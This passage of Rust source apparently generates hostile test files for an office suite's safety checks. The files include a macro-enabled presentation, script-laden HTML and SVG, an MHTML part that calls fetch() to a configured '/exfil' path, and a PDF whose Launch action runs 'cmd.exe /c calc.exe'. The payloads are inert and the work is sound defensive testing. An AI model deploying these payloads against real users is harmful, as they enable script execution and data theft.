        if let Some(ct) = bo_binary::vba::macro_enabled_content_type(CT_PPTX) {
            *t = t.replace(CT_PPTX, ct);
        }
    }
    p.put(
        "ppt/vbaProject.bin",
        Some(bo_binary::vba::CT_VBA_PROJECT),
        bo_binary::vba_write::sample_project("slide")?,
    );
    let mut prels = Vec::new();
    if let Some(i) = p
        .parts
        .iter()
        .position(|(n, _)| n == "ppt/_rels/presentation.xml.rels")
    {
        prels = p.parts.remove(i).1;
    }
    let prels = String::from_utf8(prels)?.replacen(
        "</Relationships>",
        &format!(
            r#"<Relationship Id="rIdVba" Type="{}" Target="vbaProject.bin"/></Relationships>"#,
            bo_binary::vba::REL_VBA_PROJECT
        ),
        1,
    );
    p.put("ppt/_rels/presentation.xml.rels", None, prels);
    out.push(Case {
        name: "macro-vba.pptm".into(),
        app: App::Slide,
        expect: Expect::Open,
        threat: "VBA project in a presentation",
        bytes: p.build()?,
        macros: true,
        macros_saved: true,
        keep_parts: vec!["/ppt/vbaProject.bin".into()],
        keep_text: vec![],
    });

    // SVG picture.
    let mut p = pptx_pkg(
        "",
        &slide_picture(
            2,
            r#"<a:blip r:embed="rIdPng"><a:extLst><a:ext uri="{96DAC541-7B7A-43D3-8B79-37D633B846F1}"><asvg:svgBlip xmlns:asvg="http://schemas.microsoft.com/office/drawing/2016/SVG/main" r:embed="rIdSvg"/></a:ext></a:extLst></a:blip>"#,
        ),
    )?;
    p.default_ct("svg", "image/svg+xml");
    p.put("ppt/media/hostile1.png", None, png(1, 1));
    p.put("ppt/media/hostile2.svg", None, svg_hostile(cfg));
    p.rel(
        SLIDE_RELS,
        "rIdPng",
        "image",
        "../media/hostile1.png",
        false,
    );
    p.rel(
        SLIDE_RELS,
        "rIdSvg",
        "image",
        "../media/hostile2.svg",
        false,
    );
    out.push(Case {
        name: "svg-script.pptx".into(),
        app: App::Slide,
        expect: Expect::Open,
        threat: "SVG picture with <script>, onload and external href",
        bytes: p.build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec!["/ppt/media/hostile2.svg".into()],
        keep_text: vec![],
    });

    // Malformed images, oversized text, truncation.
    let mut p = pptx_pkg(
        "",
        &[
            slide_picture(2, r#"<a:blip r:embed="rIdI1"/>"#),
            slide_picture(3, r#"<a:blip r:embed="rIdI2"/>"#),
        ]
        .concat(),
    )?;
    p.default_ct("jpeg", "image/jpeg");
    p.put("ppt/media/huge1.png", None, png(100_000, 100_000));
    p.put("ppt/media/huge2.jpeg", None, jpeg(65_500, 65_500));
    p.rel(SLIDE_RELS, "rIdI1", "image", "../media/huge1.png", false);
    p.rel(SLIDE_RELS, "rIdI2", "image", "../media/huge2.jpeg", false);
    out.push(Case {
        name: "image-huge-dimensions.pptx".into(),
        app: App::Slide,
        expect: Expect::Open,
        threat: "pictures declaring 100000² / 65500² pixels",
        bytes: p.build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec!["/ppt/media/huge1.png".into()],
        keep_text: vec![],
    });
    let long = noise(1 << 20, 4);
    out.push(Case {
        name: "oversized-string.pptx".into(),
        app: App::Slide,
        expect: Expect::Either,
        threat: "1 MiB unbroken text in a text box",
        bytes: pptx_pkg("", &text_box(2, &long, ""))?.build()?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });
    let full = pptx_pkg("", &text_box(2, "cắt cụt", ""))?.build()?;
    out.push(Case {
        name: "truncated.pptx".into(),
        app: App::Slide,
        expect: Expect::Reject,
        threat: "package cut in the middle",
        bytes: full[..full.len() / 2].to_vec(),
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });
    Ok(())
}

/// HTML with scripts, event handlers and remote resources of every kind.
fn html_hostile(cfg: &Config) -> String {
    let (h, f) = (esc(&cfg.http), esc(&cfg.file_url));
    let u = esc(&cfg.unc);
    format!(
        r#"<!DOCTYPE html><html><head><meta charset="utf-8"><title>Hostile</title><base href="{h}/base/"><meta http-equiv="refresh" content="0;url={h}/refresh"><script>/* {SCRIPT_MARKER} */ fetch("{h}/script");</script><script src="{h}/remote.js"></script><link rel="stylesheet" href="{h}/style.css"><link rel="import" href="{f}"><style>@import url("{h}/import.css"); body {{ background: url("{h}/bg.png") }} @font-face {{ font-family: X; src: url("{h}/font.woff") }}</style></head><body onload="alert('{SCRIPT_MARKER}')"><p>Trang HTML độc hại</p><img src="{h}/img.png" onerror="alert('{SCRIPT_MARKER}')"><img src="{f}"><img src="{u}\img.png"><img srcset="{h}/a.png 1x"><iframe src="{f}"></iframe><object data="{h}/x.swf"></object><embed src="{h}/e.swf"><a href="javascript:alert('{SCRIPT_MARKER}')">liên kết script</a><svg><script>/* {SCRIPT_MARKER} */</script><image href="{h}/svg.png"/></svg><video src="{h}/v.mp4" poster="{h}/p.png"></video><audio src="{h}/a.mp3"></audio><form action="{h}/submit"><input name="q"></form><table background="{h}/tb.png"><tr><td>ô</td></tr></table><noscript>{SCRIPT_MARKER}</noscript></body></html>"#
    )
}

/// MHTML ([RFC 2557] `multipart/related`) with a script part and remote parts.
fn mht_hostile(cfg: &Config) -> String {
    let h = &cfg.http;
    format!(
        "MIME-Version: 1.0\r\nContent-Type: multipart/related; boundary=\"BOUNDARY\"; type=\"text/html\"\r\n\r\n--BOUNDARY\r\nContent-Type: text/html; charset=\"utf-8\"\r\nContent-Location: {h}/page.html\r\n\r\n<html><head><script src=\"script.js\"></script><script>/* {SCRIPT_MARKER} */</script></head><body onload=\"x()\"><p>Trang MHT</p><img src=\"{h}/remote.png\"><img src=\"cid:local\"><iframe src=\"{f}\"></iframe></body></html>\r\n--BOUNDARY\r\nContent-Type: application/javascript\r\nContent-Location: {h}/script.js\r\n\r\n/* {SCRIPT_MARKER} */ fetch(\"{h}/exfil\");\r\n--BOUNDARY\r\nContent-Type: application/x-msdownload\r\nContent-Location: file:///C:/evil.exe\r\nContent-Transfer-Encoding: base64\r\n\r\nTVqQAEJsdWVPZmZpY2UgdGVzdA==\r\n--BOUNDARY--\r\n",
        f = cfg.file_url
    )
}

/// A one-page PDF ([ISO 32000-1]) with JavaScript and Launch actions, a URI and GoToR
/// link, and an embedded file — none may run or be followed.
fn pdf_hostile(cfg: &Config) -> Vec<u8> {
    let content = "BT /F1 18 Tf 72 720 Td (Hostile PDF sample) Tj ET";
    let objs = [
        "<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R /Names << /JavaScript 6 0 R /EmbeddedFiles 8 0 R >> /AA << /WC 5 0 R >> >>".to_owned(),
        "<< /Type /Pages /Kids [3 0 R] /Count 1 >>".to_owned(),
        "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 11 0 R >> >> /Annots [7 0 R 12 0 R 13 0 R] /AA << /O 5 0 R >> >>".to_owned(),
        format!("<< /Length {} >>\nstream\n{content}\nendstream", content.len()),
        format!("<< /S /JavaScript /JS (app.alert\\('{SCRIPT_MARKER}'\\); this.submitForm\\('{}/pdf'\\);) >>", cfg.http),
        "<< /Names [(js) 5 0 R] >>".to_owned(),
        "<< /Type /Annot /Subtype /Link /Rect [72 600 300 620] /A << /S /Launch /F (cmd.exe) /Win << /F (cmd.exe) /P (/c calc.exe) /O (open) >> >> >>".to_owned(),
        "<< /Names [(invoice.exe) 9 0 R] >>".to_owned(),
        "<< /Type /Filespec /F (invoice.exe) /EF << /F 10 0 R >> >>".to_owned(),
        "<< /Type /EmbeddedFile /Length 14 >>\nstream\nMZ inert test\nendstream".to_owned(),
        "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>".to_owned(),
        format!("<< /Type /Annot /Subtype /Link /Rect [72 560 300 580] /A << /S /URI /URI ({}/uri) >> >>", cfg.http),
        format!("<< /Type /Annot /Subtype /Link /Rect [72 520 300 540] /A << /S /GoToR /F ({}) /D [0 /Fit] >> >>", cfg.file_url),
    ];
    let mut out = b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n".to_vec();
    let mut offsets = Vec::new();
    for (i, o) in objs.iter().enumerate() {
        offsets.push(out.len());
        out.extend_from_slice(format!("{} 0 obj\n{o}\nendobj\n", i + 1).as_bytes());
    }
    let xref = out.len();
    let mut x = format!("xref\n0 {}\n0000000000 65535 f \n", objs.len() + 1);
    for o in offsets {
        let _ = writeln!(x, "{o:010} 00000 n ");
    }
    let _ = write!(
        x,
        "trailer\n<< /Size {} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n",
        objs.len() + 1
    );
    out.extend_from_slice(x.as_bytes());
    out
}

/// Every hostile sample, BlueDoc, BlueSheet, then BlueSlide.
///
/// # Errors
/// When a sample cannot be assembled (never with the built-in inputs).
pub fn cases(cfg: &Config) -> Result<Vec<Case>> {
    let mut out = Vec::new();
    doc_cases(cfg, &mut out)?;
    sheet_cases(cfg, &mut out)?;
    slide_cases(cfg, &mut out)?;
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn names_are_unique_and_samples_not_empty() {
        let all = cases(&Config::default()).unwrap();
        let mut names: Vec<_> = all.iter().map(|c| c.name.as_str()).collect();
        names.sort_unstable();
        names.dedup();
        assert_eq!(names.len(), all.len());
        assert!(all.iter().all(|c| !c.bytes.is_empty()));
    }

    #[test]
    fn lying_size_is_patched_in_both_headers() {
        let mut z = zip_with_bomb(&[], "b.bin", 1 << 20).unwrap();
        patch_declared_size(&mut z, "b.bin", 1000);
        let mut a = zip::ZipArchive::new(Cursor::new(z)).unwrap();
        assert_eq!(a.by_index(0).unwrap().size(), 1000);
    }

    #[test]
    fn crc_and_adler_match_known_values() {
        // RFC 1952 / RFC 1950 check values of "123456789".
        assert_eq!(crc32(b"123456789"), 0xCBF4_3926);
        assert_eq!(adler32(b"123456789"), 0x091E_01DE);
    }
}
